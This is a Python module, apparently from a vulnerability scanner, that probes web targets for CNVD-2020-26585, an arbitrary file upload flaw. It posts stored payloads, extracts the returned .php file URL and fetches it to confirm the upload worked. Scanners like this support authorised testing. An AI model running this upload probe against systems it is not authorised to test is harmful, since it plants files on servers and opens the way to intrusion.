#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import re

def cnvd_2020_26585_scan(self, url):
    ''' api_page存在任意文件上传 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileUpload'
    vul_info['vul_id'] = 'CNVD-2020-26585'
    vul_info['vul_method'] = 'POST'

    for payload in range(len(self.cnvd_2020_26585_payloads)):
        path = self.cnvd_2020_26585_payloads[payload]['path']
        data = self.cnvd_2020_26585_payloads[payload]['data']
        headers = self.cnvd_2020_26585_payloads[payload]['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
            if (('"success":1' in res.text) and file_path):
                file_path = file_path.group()                                     # * 提取返回的文件路径
                file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url

                res2 = requests.get(
                file_path, 
                timeout=self.timeout, 
                headers=self.headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
            else:
                return None

            if ('cnvd/2020/26585' in check.check_res(res2.text, 'cnvd/2020/26585')):
                results = {
                    'Target': target,
                    'Verify': file_path,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
